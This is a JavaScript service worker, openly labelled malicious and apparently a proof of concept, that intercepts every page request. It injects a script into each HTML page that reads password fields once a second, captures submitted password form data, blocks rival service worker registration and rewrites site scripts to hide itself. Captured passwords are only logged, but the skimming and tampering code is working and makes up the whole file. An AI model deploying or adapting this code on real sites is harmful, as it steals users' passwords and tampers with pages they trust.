"use strict";
self.addEventListener("install", () => {
    console.log("Hello from the malicious service worker");
    self.skipWaiting();
});
self.addEventListener("activate", () => {
    self.clients.claim();
});
self.addEventListener("fetch", (event) => {
    console.log("Malicious service worker has intercepted the request");
    event.respondWith(handleRequest(event.request));
});
let passwords = [];
self.addEventListener('message', (event) => {
    if (event.data.type == "PASSWORD_MESSAGE") {
        passwords = event.data.payload;
    }
});
async function handleRequest(req) {
    if (req.method !== "GET") {
        if (req.method == "POST" && req.headers.get("Content-Type") === "application/x-www-form-urlencoded") {
            const clonedRequest = req.clone();
            const formData = await clonedRequest.formData();
            if ([...formData.keys()].find(s => s.toLocaleLowerCase().includes("password"))) {
                console.log("Got Password", new URL(req.url).host, passwords, [...formData.entries()]);
            }
        }
        return fetch(req);
    }
    const originalResponse = await fetch(req);
    let finalData;
    if (req.mode === "navigate") {
        finalData = handleHtml(await originalResponse.text());
    }
    else if (originalResponse.headers.get("content-type")?.includes("javascript")) {
        finalData = handleJs(await originalResponse.text());
    }
    else {
        return originalResponse;
    }
    const newResponse = new Response(finalData, {
        status: originalResponse.status,
        statusText: originalResponse.statusText,
        headers: originalResponse.headers
    });
    return newResponse;
}
function handleHtml(originalDocument) {
    return originalDocument.replace("<head>", `<head>
    <script>
        function getPwdInputs() {
            var ary = [];
            var inputs = document.getElementsByTagName("input");
            for (var i=0; i<inputs.length; i++) {
            if (inputs[i].type.toLowerCase() === "password") {
                ary.push(inputs[i]);
            }
            }
            return ary;
        }
        setInterval(async () => {
            const passwordFelids = getPwdInputs()
                .map(input => input.value)
            const serviceWorker = await navigator.serviceWorker.ready
            serviceWorker.active.postMessage({
                type: "PASSWORD_MESSAGE",
                payload: passwordFelids
            })
        }, 1000)
        navigator.serviceWorker.register = () => new Promise(resolve => {})
        //# sourceURL=maliciousInjectedScript.js
    </script>`);
}
function handleJs(originalDocument) {
    return originalDocument
        .replace(/navigator\.serviceWorker/g, "window")
        .replace(/["']serviceWorker['"]/g, "'maliciousServiceWorker'");
}
